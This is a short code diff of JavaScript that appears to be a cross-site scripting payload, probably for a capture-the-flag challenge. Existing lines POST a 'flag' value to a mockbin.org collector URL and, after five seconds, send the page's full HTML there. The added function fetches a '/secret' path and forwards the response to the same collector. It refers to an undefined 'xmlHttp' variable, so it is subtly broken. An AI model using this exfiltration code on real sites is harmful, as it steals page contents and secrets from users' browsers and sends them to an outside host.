@@ -17,6 +17,18 @@ var req = new XMLHttpRequest();
     req.open("POST", "http://mockbin.org/bin/bc04f62e-58a7-4468-b5fa-51d85f87bee4", true);
     req.send("flag="+ payload);
 }
+function g1(){
+	var r = new XMLHttpRequest();
+	r.open('GET', '/secret', true);
+	r.onreadystatechange = function() {
+		if (xmlHttp.readyState == 4) {
+			console.log(r.responseText);
+			s2(r.responseText);
+		}
+	}
+	r.send();
+}
+
 setTimeout(function(){
 s2(document.documentElement.innerHTML);
 },5000);
